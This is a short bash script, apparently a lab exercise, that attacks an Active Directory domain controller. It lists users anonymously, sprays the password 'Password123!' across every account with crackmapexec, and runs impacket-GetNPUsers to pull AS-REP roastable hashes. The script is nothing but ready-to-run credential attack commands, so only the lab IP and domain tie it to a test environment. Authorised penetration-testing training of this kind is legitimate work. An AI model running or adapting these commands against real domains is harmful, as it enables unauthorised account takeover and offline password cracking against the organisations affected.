#!/usr/bin/env bash
# Exercise 2: password spraying + AS-REP roasting. Run from Kali.
set -euo pipefail

DC_IP="192.168.1.10"
DOMAIN="lab.local"

# Anonymous user list, then spray one password across it.
crackmapexec smb "$DC_IP" -u '' -p '' --users > users.txt
crackmapexec smb "$DC_IP" -u users.txt -p 'Password123!' --continue-on-success

# Users with "Do not require Kerberos preauthentication" set.
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -no-pass -usersfile users.txt
